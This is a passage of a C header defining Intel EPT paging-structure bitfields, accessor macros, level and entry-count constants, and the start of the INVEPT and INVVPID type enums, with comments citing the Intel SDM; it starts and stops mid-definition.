     * [Bit 1] Write access; indicates whether writes are allowed from the 512-GByte region
     * controlled by this entry.
     */
    UINT64 WriteAccess : 1;
#define EPT_PML4_WRITE_ACCESS_BIT 1
#define EPT_PML4_WRITE_ACCESS_FLAG 0x02
#define EPT_PML4_WRITE_ACCESS_MASK 0x01
#define EPT_PML4_WRITE_ACCESS(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] If the "mode-based execute control for EPT" VM-execution control is 0, execute
     * access; indicates whether instruction fetches are allowed from the 512-GByte region
     * controlled by this entry. If that control is 1, execute access for supervisor-mode linear
     * addresses; indicates whether instruction fetches are allowed from supervisor-mode linear
     * addresses in the 512-GByte region controlled by this entry.
     */
    UINT64 ExecuteAccess : 1;
#define EPT_PML4_EXECUTE_ACCESS_BIT 2
#define EPT_PML4_EXECUTE_ACCESS_FLAG 0x04
#define EPT_PML4_EXECUTE_ACCESS_MASK 0x01
#define EPT_PML4_EXECUTE_ACCESS(_) (((_) >> 2) & 0x01)
    UINT64 Reserved1 : 5;

    /**
     * [Bit 8] If bit 6 of EPTP is 1, accessed flag for EPT; indicates whether software has accessed
     * the 512-GByte region controlled by this entry. Ignored if bit 6 of EPTP is 0.
     *
     * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
     */
    UINT64 Accessed : 1;
#define EPT_PML4_ACCESSED_BIT 8
#define EPT_PML4_ACCESSED_FLAG 0x100
#define EPT_PML4_ACCESSED_MASK 0x01
#define EPT_PML4_ACCESSED(_) (((_) >> 8) & 0x01)
    UINT64 Reserved2 : 1;

    /**
     * [Bit 10] Execute access for user-mode linear addresses. If the "mode-based execute control
     * for EPT" VM-execution control is 1, indicates whether instruction fetches are allowed from
     * user-mode linear addresses in the 512-GByte region controlled by this entry. If that control
     * is 0, this bit is ignored.
     */
    UINT64 UserModeExecute : 1;
#define EPT_PML4_USER_MODE_EXECUTE_BIT 10
#define EPT_PML4_USER_MODE_EXECUTE_FLAG 0x400
#define EPT_PML4_USER_MODE_EXECUTE_MASK 0x01
#define EPT_PML4_USER_MODE_EXECUTE(_) (((_) >> 10) & 0x01)
    UINT64 Reserved3 : 1;

    /**
     * [Bits 47:12] Physical address of 4-KByte aligned EPT page-directory-pointer table referenced
     * by this entry.
     */
    UINT64 PageFrameNumber : 36;
#define EPT_PML4_PAGE_FRAME_NUMBER_BIT 12
#define EPT_PML4_PAGE_FRAME_NUMBER_FLAG 0xFFFFFFFFF000
#define EPT_PML4_PAGE_FRAME_NUMBER_MASK 0xFFFFFFFFF
#define EPT_PML4_PAGE_FRAME_NUMBER(_) (((_) >> 12) & 0xFFFFFFFFF)
    UINT64 Reserved4 : 16;
  };

  UINT64 Flags;
} EPT_PML4;

/**
 * @brief Format of an EPT Page-Directory-Pointer-Table Entry (PDPTE) that Maps a 1-GByte Page
 */
typedef union {
  struct {
    /**
     * [Bit 0] Read access; indicates whether reads are allowed from the 1-GByte page referenced by
     * this entry.
     */
    UINT64 ReadAccess : 1;
#define EPDPTE_1GB_READ_ACCESS_BIT 0
#define EPDPTE_1GB_READ_ACCESS_FLAG 0x01
#define EPDPTE_1GB_READ_ACCESS_MASK 0x01
#define EPDPTE_1GB_READ_ACCESS(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Write access; indicates whether writes are allowed from the 1-GByte page referenced
     * by this entry.
     */
    UINT64 WriteAccess : 1;
#define EPDPTE_1GB_WRITE_ACCESS_BIT 1
#define EPDPTE_1GB_WRITE_ACCESS_FLAG 0x02
#define EPDPTE_1GB_WRITE_ACCESS_MASK 0x01
#define EPDPTE_1GB_WRITE_ACCESS(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] If the "mode-based execute control for EPT" VM-execution control is 0, execute
     * access; indicates whether instruction fetches are allowed from the 1-GByte page controlled by
     * this entry. If that control is 1, execute access for supervisor-mode linear addresses;
     * indicates whether instruction fetches are allowed from supervisor-mode linear addresses in
     * the 1-GByte page controlled by this entry.
     */
    UINT64 ExecuteAccess : 1;
#define EPDPTE_1GB_EXECUTE_ACCESS_BIT 2
#define EPDPTE_1GB_EXECUTE_ACCESS_FLAG 0x04
#define EPDPTE_1GB_EXECUTE_ACCESS_MASK 0x01
#define EPDPTE_1GB_EXECUTE_ACCESS(_) (((_) >> 2) & 0x01)

    /**
     * [Bits 5:3] EPT memory type for this 1-GByte page.
     *
     * @see Vol3C[28.2.6(EPT and memory Typing)]
     */
    UINT64 MemoryType : 3;
#define EPDPTE_1GB_MEMORY_TYPE_BIT 3
#define EPDPTE_1GB_MEMORY_TYPE_FLAG 0x38
#define EPDPTE_1GB_MEMORY_TYPE_MASK 0x07
#define EPDPTE_1GB_MEMORY_TYPE(_) (((_) >> 3) & 0x07)

    /**
     * [Bit 6] Ignore PAT memory type for this 1-GByte page.
     *
     * @see Vol3C[28.2.6(EPT and memory Typing)]
     */
    UINT64 IgnorePat : 1;
#define EPDPTE_1GB_IGNORE_PAT_BIT 6
#define EPDPTE_1GB_IGNORE_PAT_FLAG 0x40
#define EPDPTE_1GB_IGNORE_PAT_MASK 0x01
#define EPDPTE_1GB_IGNORE_PAT(_) (((_) >> 6) & 0x01)

    /**
     * [Bit 7] Must be 1 (otherwise, this entry references an EPT page directory).
     */
    UINT64 LargePage : 1;
#define EPDPTE_1GB_LARGE_PAGE_BIT 7
#define EPDPTE_1GB_LARGE_PAGE_FLAG 0x80
#define EPDPTE_1GB_LARGE_PAGE_MASK 0x01
#define EPDPTE_1GB_LARGE_PAGE(_) (((_) >> 7) & 0x01)

    /**
     * [Bit 8] If bit 6 of EPTP is 1, accessed flag for EPT; indicates whether software has accessed
     * the 1-GByte page referenced by this entry. Ignored if bit 6 of EPTP is 0.
     *
     * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
     */
    UINT64 Accessed : 1;
#define EPDPTE_1GB_ACCESSED_BIT 8
#define EPDPTE_1GB_ACCESSED_FLAG 0x100
#define EPDPTE_1GB_ACCESSED_MASK 0x01
#define EPDPTE_1GB_ACCESSED(_) (((_) >> 8) & 0x01)

    /**
     * [Bit 9] If bit 6 of EPTP is 1, dirty flag for EPT; indicates whether software has written to
     * the 1-GByte page referenced by this entry. Ignored if bit 6 of EPTP is 0.
     *
     * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
     */
    UINT64 Dirty : 1;
#define EPDPTE_1GB_DIRTY_BIT 9
#define EPDPTE_1GB_DIRTY_FLAG 0x200
#define EPDPTE_1GB_DIRTY_MASK 0x01
#define EPDPTE_1GB_DIRTY(_) (((_) >> 9) & 0x01)

    /**
     * [Bit 10] Execute access for user-mode linear addresses. If the "mode-based execute control
     * for EPT" VM-execution control is 1, indicates whether instruction fetches are allowed from
     * user-mode linear addresses in the 1-GByte page controlled by this entry. If that control is
     * 0, this bit is ignored.
     */
    UINT64 UserModeExecute : 1;
#define EPDPTE_1GB_USER_MODE_EXECUTE_BIT 10
#define EPDPTE_1GB_USER_MODE_EXECUTE_FLAG 0x400
#define EPDPTE_1GB_USER_MODE_EXECUTE_MASK 0x01
#define EPDPTE_1GB_USER_MODE_EXECUTE(_) (((_) >> 10) & 0x01)
    UINT64 Reserved1 : 19;

    /**
     * [Bits 47:30] Physical address of 4-KByte aligned EPT page-directory-pointer table referenced
     * by this entry.
     */
    UINT64 PageFrameNumber : 18;
#define EPDPTE_1GB_PAGE_FRAME_NUMBER_BIT 30
#define EPDPTE_1GB_PAGE_FRAME_NUMBER_FLAG 0xFFFFC0000000
#define EPDPTE_1GB_PAGE_FRAME_NUMBER_MASK 0x3FFFF
#define EPDPTE_1GB_PAGE_FRAME_NUMBER(_) (((_) >> 30) & 0x3FFFF)
    UINT64 Reserved2 : 15;

    /**
     * [Bit 63] Suppress \#VE. If the "EPT-violation \#VE" VM-execution control is 1, EPT violations
     * caused by accesses to this page are convertible to virtualization exceptions only if this bit
     * is 0. If "EPT-violation \#VE" VMexecution control is 0, this bit is ignored.
     *
     * @see Vol3C[25.5.6.1(Convertible EPT Violations)]
     */
    UINT64 SuppressVe : 1;
#define EPDPTE_1GB_SUPPRESS_VE_BIT 63
#define EPDPTE_1GB_SUPPRESS_VE_FLAG 0x8000000000000000
#define EPDPTE_1GB_SUPPRESS_VE_MASK 0x01
#define EPDPTE_1GB_SUPPRESS_VE(_) (((_) >> 63) & 0x01)
  };

  UINT64 Flags;
} EPDPTE_1GB;

/**
 * @brief Format of an EPT Page-Directory-Pointer-Table Entry (PDPTE) that References an EPT Page
 * Directory
 */
typedef union {
  struct {
    /**
     * [Bit 0] Read access; indicates whether reads are allowed from the 1-GByte region controlled
     * by this entry.
     */
    UINT64 ReadAccess : 1;
#define EPDPTE_READ_ACCESS_BIT 0
#define EPDPTE_READ_ACCESS_FLAG 0x01
#define EPDPTE_READ_ACCESS_MASK 0x01
#define EPDPTE_READ_ACCESS(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Write access; indicates whether writes are allowed from the 1-GByte region controlled
     * by this entry.
     */
    UINT64 WriteAccess : 1;
#define EPDPTE_WRITE_ACCESS_BIT 1
#define EPDPTE_WRITE_ACCESS_FLAG 0x02
#define EPDPTE_WRITE_ACCESS_MASK 0x01
#define EPDPTE_WRITE_ACCESS(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] If the "mode-based execute control for EPT" VM-execution control is 0, execute
     * access; indicates whether instruction fetches are allowed from the 1-GByte region controlled
     * by this entry. If that control is 1, execute access for supervisor-mode linear addresses;
     * indicates whether instruction fetches are allowed from supervisor-mode linear addresses in
     * the 1-GByte region controlled by this entry.
     */
    UINT64 ExecuteAccess : 1;
#define EPDPTE_EXECUTE_ACCESS_BIT 2
#define EPDPTE_EXECUTE_ACCESS_FLAG 0x04
#define EPDPTE_EXECUTE_ACCESS_MASK 0x01
#define EPDPTE_EXECUTE_ACCESS(_) (((_) >> 2) & 0x01)
    UINT64 Reserved1 : 5;

    /**
     * [Bit 8] If bit 6 of EPTP is 1, accessed flag for EPT; indicates whether software has accessed
     * the 1-GByte region controlled by this entry. Ignored if bit 6 of EPTP is 0.
     *
     * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
     */
    UINT64 Accessed : 1;
#define EPDPTE_ACCESSED_BIT 8
#define EPDPTE_ACCESSED_FLAG 0x100
#define EPDPTE_ACCESSED_MASK 0x01
#define EPDPTE_ACCESSED(_) (((_) >> 8) & 0x01)
    UINT64 Reserved2 : 1;

    /**
     * [Bit 10] Execute access for user-mode linear addresses. If the "mode-based execute control
     * for EPT" VM-execution control is 1, indicates whether instruction fetches are allowed from
     * user-mode linear addresses in the 1-GByte region controlled by this entry. If that control is
     * 0, this bit is ignored.
     */
    UINT64 UserModeExecute : 1;
#define EPDPTE_USER_MODE_EXECUTE_BIT 10
#define EPDPTE_USER_MODE_EXECUTE_FLAG 0x400
#define EPDPTE_USER_MODE_EXECUTE_MASK 0x01
#define EPDPTE_USER_MODE_EXECUTE(_) (((_) >> 10) & 0x01)
    UINT64 Reserved3 : 1;

    /**
     * [Bits 47:12] Physical address of 4-KByte aligned EPT page-directory-pointer table referenced
     * by this entry.
     */
    UINT64 PageFrameNumber : 36;
#define EPDPTE_PAGE_FRAME_NUMBER_BIT 12
#define EPDPTE_PAGE_FRAME_NUMBER_FLAG 0xFFFFFFFFF000
#define EPDPTE_PAGE_FRAME_NUMBER_MASK 0xFFFFFFFFF
#define EPDPTE_PAGE_FRAME_NUMBER(_) (((_) >> 12) & 0xFFFFFFFFF)
    UINT64 Reserved4 : 16;
  };

  UINT64 Flags;
} EPDPTE;

/**
 * @brief Format of an EPT Page-Directory Entry (PDE) that Maps a 2-MByte Page
 */
typedef union {
  struct {
    /**
     * [Bit 0] Read access; indicates whether reads are allowed from the 2-MByte page referenced by
     * this entry.
     */
    UINT64 ReadAccess : 1;
#define EPDE_2MB_READ_ACCESS_BIT 0
#define EPDE_2MB_READ_ACCESS_FLAG 0x01
#define EPDE_2MB_READ_ACCESS_MASK 0x01
#define EPDE_2MB_READ_ACCESS(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Write access; indicates whether writes are allowed from the 2-MByte page referenced
     * by this entry.
     */
    UINT64 WriteAccess : 1;
#define EPDE_2MB_WRITE_ACCESS_BIT 1
#define EPDE_2MB_WRITE_ACCESS_FLAG 0x02
#define EPDE_2MB_WRITE_ACCESS_MASK 0x01
#define EPDE_2MB_WRITE_ACCESS(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] If the "mode-based execute control for EPT" VM-execution control is 0, execute
     * access; indicates whether instruction fetches are allowed from the 2-MByte page controlled by
     * this entry. If that control is 1, execute access for supervisor-mode linear addresses;
     * indicates whether instruction fetches are allowed from supervisor-mode linear addresses in
     * the 2-MByte page controlled by this entry.
     */
    UINT64 ExecuteAccess : 1;
#define EPDE_2MB_EXECUTE_ACCESS_BIT 2
#define EPDE_2MB_EXECUTE_ACCESS_FLAG 0x04
#define EPDE_2MB_EXECUTE_ACCESS_MASK 0x01
#define EPDE_2MB_EXECUTE_ACCESS(_) (((_) >> 2) & 0x01)

    /**
     * [Bits 5:3] EPT memory type for this 2-MByte page.
     *
     * @see Vol3C[28.2.6(EPT and memory Typing)]
     */
    UINT64 MemoryType : 3;
#define EPDE_2MB_MEMORY_TYPE_BIT 3
#define EPDE_2MB_MEMORY_TYPE_FLAG 0x38
#define EPDE_2MB_MEMORY_TYPE_MASK 0x07
#define EPDE_2MB_MEMORY_TYPE(_) (((_) >> 3) & 0x07)

    /**
     * [Bit 6] Ignore PAT memory type for this 2-MByte page.
     *
     * @see Vol3C[28.2.6(EPT and memory Typing)]
     */
    UINT64 IgnorePat : 1;
#define EPDE_2MB_IGNORE_PAT_BIT 6
#define EPDE_2MB_IGNORE_PAT_FLAG 0x40
#define EPDE_2MB_IGNORE_PAT_MASK 0x01
#define EPDE_2MB_IGNORE_PAT(_) (((_) >> 6) & 0x01)

    /**
     * [Bit 7] Must be 1 (otherwise, this entry references an EPT page table).
     */
    UINT64 LargePage : 1;
#define EPDE_2MB_LARGE_PAGE_BIT 7
#define EPDE_2MB_LARGE_PAGE_FLAG 0x80
#define EPDE_2MB_LARGE_PAGE_MASK 0x01
#define EPDE_2MB_LARGE_PAGE(_) (((_) >> 7) & 0x01)

    /**
     * [Bit 8] If bit 6 of EPTP is 1, accessed flag for EPT; indicates whether software has accessed
     * the 2-MByte page referenced by this entry. Ignored if bit 6 of EPTP is 0.
     *
     * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
     */
    UINT64 Accessed : 1;
#define EPDE_2MB_ACCESSED_BIT 8
#define EPDE_2MB_ACCESSED_FLAG 0x100
#define EPDE_2MB_ACCESSED_MASK 0x01
#define EPDE_2MB_ACCESSED(_) (((_) >> 8) & 0x01)

    /**
     * [Bit 9] If bit 6 of EPTP is 1, dirty flag for EPT; indicates whether software has written to
     * the 2-MByte page referenced by this entry. Ignored if bit 6 of EPTP is 0.
     *
     * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
     */
    UINT64 Dirty : 1;
#define EPDE_2MB_DIRTY_BIT 9
#define EPDE_2MB_DIRTY_FLAG 0x200
#define EPDE_2MB_DIRTY_MASK 0x01
#define EPDE_2MB_DIRTY(_) (((_) >> 9) & 0x01)

    /**
     * [Bit 10] Execute access for user-mode linear addresses. If the "mode-based execute control
     * for EPT" VM-execution control is 1, indicates whether instruction fetches are allowed from
     * user-mode linear addresses in the 2-MByte page controlled by this entry. If that control is
     * 0, this bit is ignored.
     */
    UINT64 UserModeExecute : 1;
#define EPDE_2MB_USER_MODE_EXECUTE_BIT 10
#define EPDE_2MB_USER_MODE_EXECUTE_FLAG 0x400
#define EPDE_2MB_USER_MODE_EXECUTE_MASK 0x01
#define EPDE_2MB_USER_MODE_EXECUTE(_) (((_) >> 10) & 0x01)
    UINT64 Reserved1 : 10;

    /**
     * [Bits 47:21] Physical address of 4-KByte aligned EPT page-directory-pointer table referenced
     * by this entry.
     */
    UINT64 PageFrameNumber : 27;
#define EPDE_2MB_PAGE_FRAME_NUMBER_BIT 21
#define EPDE_2MB_PAGE_FRAME_NUMBER_FLAG 0xFFFFFFE00000
#define EPDE_2MB_PAGE_FRAME_NUMBER_MASK 0x7FFFFFF
#define EPDE_2MB_PAGE_FRAME_NUMBER(_) (((_) >> 21) & 0x7FFFFFF)
    UINT64 Reserved2 : 15;

    /**
     * [Bit 63] Suppress \#VE. If the "EPT-violation \#VE" VM-execution control is 1, EPT violations
     * caused by accesses to this page are convertible to virtualization exceptions only if this bit
     * is 0. If "EPT-violation \#VE" VMexecution control is 0, this bit is ignored.
     *
     * @see Vol3C[25.5.6.1(Convertible EPT Violations)]
     */
    UINT64 SuppressVe : 1;
#define EPDE_2MB_SUPPRESS_VE_BIT 63
#define EPDE_2MB_SUPPRESS_VE_FLAG 0x8000000000000000
#define EPDE_2MB_SUPPRESS_VE_MASK 0x01
#define EPDE_2MB_SUPPRESS_VE(_) (((_) >> 63) & 0x01)
  };

  UINT64 Flags;
} EPDE_2MB;

/**
 * @brief Format of an EPT Page-Directory Entry (PDE) that References an EPT Page Table
 */
typedef union {
  struct {
    /**
     * [Bit 0] Read access; indicates whether reads are allowed from the 2-MByte region controlled
     * by this entry.
     */
    UINT64 ReadAccess : 1;
#define EPDE_READ_ACCESS_BIT 0
#define EPDE_READ_ACCESS_FLAG 0x01
#define EPDE_READ_ACCESS_MASK 0x01
#define EPDE_READ_ACCESS(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Write access; indicates whether writes are allowed from the 2-MByte region controlled
     * by this entry.
     */
    UINT64 WriteAccess : 1;
#define EPDE_WRITE_ACCESS_BIT 1
#define EPDE_WRITE_ACCESS_FLAG 0x02
#define EPDE_WRITE_ACCESS_MASK 0x01
#define EPDE_WRITE_ACCESS(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] If the "mode-based execute control for EPT" VM-execution control is 0, execute
     * access; indicates whether instruction fetches are allowed from the 2-MByte region controlled
     * by this entry. If that control is 1, execute access for supervisor-mode linear addresses;
     * indicates whether instruction fetches are allowed from supervisor-mode linear addresses in
     * the 2-MByte region controlled by this entry.
     */
    UINT64 ExecuteAccess : 1;
#define EPDE_EXECUTE_ACCESS_BIT 2
#define EPDE_EXECUTE_ACCESS_FLAG 0x04
#define EPDE_EXECUTE_ACCESS_MASK 0x01
#define EPDE_EXECUTE_ACCESS(_) (((_) >> 2) & 0x01)
    UINT64 Reserved1 : 5;

    /**
     * [Bit 8] If bit 6 of EPTP is 1, accessed flag for EPT; indicates whether software has accessed
     * the 2-MByte region controlled by this entry. Ignored if bit 6 of EPTP is 0.
     *
     * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
     */
    UINT64 Accessed : 1;
#define EPDE_ACCESSED_BIT 8
#define EPDE_ACCESSED_FLAG 0x100
#define EPDE_ACCESSED_MASK 0x01
#define EPDE_ACCESSED(_) (((_) >> 8) & 0x01)
    UINT64 Reserved2 : 1;

    /**
     * [Bit 10] Execute access for user-mode linear addresses. If the "mode-based execute control
     * for EPT" VM-execution control is 1, indicates whether instruction fetches are allowed from
     * user-mode linear addresses in the 2-MByte region controlled by this entry. If that control is
     * 0, this bit is ignored.
     */
    UINT64 UserModeExecute : 1;
#define EPDE_USER_MODE_EXECUTE_BIT 10
#define EPDE_USER_MODE_EXECUTE_FLAG 0x400
#define EPDE_USER_MODE_EXECUTE_MASK 0x01
#define EPDE_USER_MODE_EXECUTE(_) (((_) >> 10) & 0x01)
    UINT64 Reserved3 : 1;

    /**
     * [Bits 47:12] Physical address of 4-KByte aligned EPT page table referenced by this entry.
     */
    UINT64 PageFrameNumber : 36;
#define EPDE_PAGE_FRAME_NUMBER_BIT 12
#define EPDE_PAGE_FRAME_NUMBER_FLAG 0xFFFFFFFFF000
#define EPDE_PAGE_FRAME_NUMBER_MASK 0xFFFFFFFFF
#define EPDE_PAGE_FRAME_NUMBER(_) (((_) >> 12) & 0xFFFFFFFFF)
    UINT64 Reserved4 : 16;
  };

  UINT64 Flags;
} EPDE;

/**
 * @brief Format of an EPT Page-Table Entry that Maps a 4-KByte Page
 */
typedef union {
  struct {
    /**
     * [Bit 0] Read access; indicates whether reads are allowed from the 4-KByte page referenced by
     * this entry.
     */
    UINT64 ReadAccess : 1;
#define EPTE_READ_ACCESS_BIT 0
#define EPTE_READ_ACCESS_FLAG 0x01
#define EPTE_READ_ACCESS_MASK 0x01
#define EPTE_READ_ACCESS(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Write access; indicates whether writes are allowed from the 4-KByte page referenced
     * by this entry.
     */
    UINT64 WriteAccess : 1;
#define EPTE_WRITE_ACCESS_BIT 1
#define EPTE_WRITE_ACCESS_FLAG 0x02
#define EPTE_WRITE_ACCESS_MASK 0x01
#define EPTE_WRITE_ACCESS(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] If the "mode-based execute control for EPT" VM-execution control is 0, execute
     * access; indicates whether instruction fetches are allowed from the 4-KByte page controlled by
     * this entry. If that control is 1, execute access for supervisor-mode linear addresses;
     * indicates whether instruction fetches are allowed from supervisor-mode linear addresses in
     * the 4-KByte page controlled by this entry.
     */
    UINT64 ExecuteAccess : 1;
#define EPTE_EXECUTE_ACCESS_BIT 2
#define EPTE_EXECUTE_ACCESS_FLAG 0x04
#define EPTE_EXECUTE_ACCESS_MASK 0x01
#define EPTE_EXECUTE_ACCESS(_) (((_) >> 2) & 0x01)

    /**
     * [Bits 5:3] EPT memory type for this 4-KByte page.
     *
     * @see Vol3C[28.2.6(EPT and memory Typing)]
     */
    UINT64 MemoryType : 3;
#define EPTE_MEMORY_TYPE_BIT 3
#define EPTE_MEMORY_TYPE_FLAG 0x38
#define EPTE_MEMORY_TYPE_MASK 0x07
#define EPTE_MEMORY_TYPE(_) (((_) >> 3) & 0x07)

    /**
     * [Bit 6] Ignore PAT memory type for this 4-KByte page.
     *
     * @see Vol3C[28.2.6(EPT and memory Typing)]
     */
    UINT64 IgnorePat : 1;
#define EPTE_IGNORE_PAT_BIT 6
#define EPTE_IGNORE_PAT_FLAG 0x40
#define EPTE_IGNORE_PAT_MASK 0x01
#define EPTE_IGNORE_PAT(_) (((_) >> 6) & 0x01)
    UINT64 Reserved1 : 1;

    /**
     * [Bit 8] If bit 6 of EPTP is 1, accessed flag for EPT; indicates whether software has accessed
     * the 4-KByte page referenced by this entry. Ignored if bit 6 of EPTP is 0.
     *
     * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
     */
    UINT64 Accessed : 1;
#define EPTE_ACCESSED_BIT 8
#define EPTE_ACCESSED_FLAG 0x100
#define EPTE_ACCESSED_MASK 0x01
#define EPTE_ACCESSED(_) (((_) >> 8) & 0x01)

    /**
     * [Bit 9] If bit 6 of EPTP is 1, dirty flag for EPT; indicates whether software has written to
     * the 4-KByte page referenced by this entry. Ignored if bit 6 of EPTP is 0.
     *
     * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
     */
    UINT64 Dirty : 1;
#define EPTE_DIRTY_BIT 9
#define EPTE_DIRTY_FLAG 0x200
#define EPTE_DIRTY_MASK 0x01
#define EPTE_DIRTY(_) (((_) >> 9) & 0x01)

    /**
     * [Bit 10] Execute access for user-mode linear addresses. If the "mode-based execute control
     * for EPT" VM-execution control is 1, indicates whether instruction fetches are allowed from
     * user-mode linear addresses in the 4-KByte page controlled by this entry. If that control is
     * 0, this bit is ignored.
     */
    UINT64 UserModeExecute : 1;
#define EPTE_USER_MODE_EXECUTE_BIT 10
#define EPTE_USER_MODE_EXECUTE_FLAG 0x400
#define EPTE_USER_MODE_EXECUTE_MASK 0x01
#define EPTE_USER_MODE_EXECUTE(_) (((_) >> 10) & 0x01)
    UINT64 Reserved2 : 1;

    /**
     * [Bits 47:12] Physical address of the 4-KByte page referenced by this entry.
     */
    UINT64 PageFrameNumber : 36;
#define EPTE_PAGE_FRAME_NUMBER_BIT 12
#define EPTE_PAGE_FRAME_NUMBER_FLAG 0xFFFFFFFFF000
#define EPTE_PAGE_FRAME_NUMBER_MASK 0xFFFFFFFFF
#define EPTE_PAGE_FRAME_NUMBER(_) (((_) >> 12) & 0xFFFFFFFFF)
    UINT64 Reserved3 : 15;

    /**
     * [Bit 63] Suppress \#VE. If the "EPT-violation \#VE" VM-execution control is 1, EPT violations
     * caused by accesses to this page are convertible to virtualization exceptions only if this bit
     * is 0. If "EPT-violation \#VE" VMexecution control is 0, this bit is ignored.
     *
     * @see Vol3C[25.5.6.1(Convertible EPT Violations)]
     */
    UINT64 SuppressVe : 1;
#define EPTE_SUPPRESS_VE_BIT 63
#define EPTE_SUPPRESS_VE_FLAG 0x8000000000000000
#define EPTE_SUPPRESS_VE_MASK 0x01
#define EPTE_SUPPRESS_VE(_) (((_) >> 63) & 0x01)
  };

  UINT64 Flags;
} EPTE;

/**
 * @brief Format of a common EPT Entry
 */
typedef union {
  struct {
    UINT64 ReadAccess : 1;
#define EPT_ENTRY_READ_ACCESS_BIT 0
#define EPT_ENTRY_READ_ACCESS_FLAG 0x01
#define EPT_ENTRY_READ_ACCESS_MASK 0x01
#define EPT_ENTRY_READ_ACCESS(_) (((_) >> 0) & 0x01)
    UINT64 WriteAccess : 1;
#define EPT_ENTRY_WRITE_ACCESS_BIT 1
#define EPT_ENTRY_WRITE_ACCESS_FLAG 0x02
#define EPT_ENTRY_WRITE_ACCESS_MASK 0x01
#define EPT_ENTRY_WRITE_ACCESS(_) (((_) >> 1) & 0x01)
    UINT64 ExecuteAccess : 1;
#define EPT_ENTRY_EXECUTE_ACCESS_BIT 2
#define EPT_ENTRY_EXECUTE_ACCESS_FLAG 0x04
#define EPT_ENTRY_EXECUTE_ACCESS_MASK 0x01
#define EPT_ENTRY_EXECUTE_ACCESS(_) (((_) >> 2) & 0x01)
    UINT64 MemoryType : 3;
#define EPT_ENTRY_MEMORY_TYPE_BIT 3
#define EPT_ENTRY_MEMORY_TYPE_FLAG 0x38
#define EPT_ENTRY_MEMORY_TYPE_MASK 0x07
#define EPT_ENTRY_MEMORY_TYPE(_) (((_) >> 3) & 0x07)
    UINT64 IgnorePat : 1;
#define EPT_ENTRY_IGNORE_PAT_BIT 6
#define EPT_ENTRY_IGNORE_PAT_FLAG 0x40
#define EPT_ENTRY_IGNORE_PAT_MASK 0x01
#define EPT_ENTRY_IGNORE_PAT(_) (((_) >> 6) & 0x01)
    UINT64 LargePage : 1;
#define EPT_ENTRY_LARGE_PAGE_BIT 7
#define EPT_ENTRY_LARGE_PAGE_FLAG 0x80
#define EPT_ENTRY_LARGE_PAGE_MASK 0x01
#define EPT_ENTRY_LARGE_PAGE(_) (((_) >> 7) & 0x01)
    UINT64 Accessed : 1;
#define EPT_ENTRY_ACCESSED_BIT 8
#define EPT_ENTRY_ACCESSED_FLAG 0x100
#define EPT_ENTRY_ACCESSED_MASK 0x01
#define EPT_ENTRY_ACCESSED(_) (((_) >> 8) & 0x01)
    UINT64 Dirty : 1;
#define EPT_ENTRY_DIRTY_BIT 9
#define EPT_ENTRY_DIRTY_FLAG 0x200
#define EPT_ENTRY_DIRTY_MASK 0x01
#define EPT_ENTRY_DIRTY(_) (((_) >> 9) & 0x01)
    UINT64 UserModeExecute : 1;
#define EPT_ENTRY_USER_MODE_EXECUTE_BIT 10
#define EPT_ENTRY_USER_MODE_EXECUTE_FLAG 0x400
#define EPT_ENTRY_USER_MODE_EXECUTE_MASK 0x01
#define EPT_ENTRY_USER_MODE_EXECUTE(_) (((_) >> 10) & 0x01)
    UINT64 Reserved1 : 1;
    UINT64 PageFrameNumber : 36;
#define EPT_ENTRY_PAGE_FRAME_NUMBER_BIT 12
#define EPT_ENTRY_PAGE_FRAME_NUMBER_FLAG 0xFFFFFFFFF000
#define EPT_ENTRY_PAGE_FRAME_NUMBER_MASK 0xFFFFFFFFF
#define EPT_ENTRY_PAGE_FRAME_NUMBER(_) (((_) >> 12) & 0xFFFFFFFFF)
    UINT64 Reserved2 : 15;
    UINT64 SuppressVe : 1;
#define EPT_ENTRY_SUPPRESS_VE_BIT 63
#define EPT_ENTRY_SUPPRESS_VE_FLAG 0x8000000000000000
#define EPT_ENTRY_SUPPRESS_VE_MASK 0x01
#define EPT_ENTRY_SUPPRESS_VE(_) (((_) >> 63) & 0x01)
  };

  UINT64 Flags;
} EPT_ENTRY;

/**
 * @defgroup EPT_TABLE_LEVEL \
 *           EPT Table level numbers
 *
 * EPT Table level numbers.
 * @{
 */
#define EPT_LEVEL_PML4E 0x00000003
#define EPT_LEVEL_PDPTE 0x00000002
#define EPT_LEVEL_PDE 0x00000001
#define EPT_LEVEL_PTE 0x00000000
/**
 * @}
 */

/**
 * @defgroup EPT_ENTRY_COUNT \
 *           EPT Entry counts
 *
 * EPT Entry counts.
 * @{
 */
#define EPT_PML4E_ENTRY_COUNT 0x00000200
#define EPT_PDPTE_ENTRY_COUNT 0x00000200
#define EPT_PDE_ENTRY_COUNT 0x00000200
#define EPT_PTE_ENTRY_COUNT 0x00000200
/**
 * @}
 */

/**
 * @}
 */

typedef enum {
  /**
   * If the INVEPT type is 1, the logical processor invalidates all guest-physical mappings and
   * combined mappings associated with the EP4TA specified in the INVEPT descriptor. Combined
   * mappings for that EP4TA are invalidated for all VPIDs and all PCIDs. (The instruction may
   * invalidate mappings associated with other EP4TAs.)
   */
  InveptSingleContext = 0x00000001,

  /**
   * If the INVEPT type is 2, the logical processor invalidates guest-physical mappings and combined
   * mappings associated with all EP4TAs (and, for combined mappings, for all VPIDs and PCIDs).
   */
  InveptAllContext = 0x00000002,
} INVEPT_TYPE;

typedef enum {
  /**
   * If the INVVPID type is 0, the logical processor invalidates linear mappings and combined
   * mappings associated with the VPID specified in the INVVPID descriptor and that would be used to
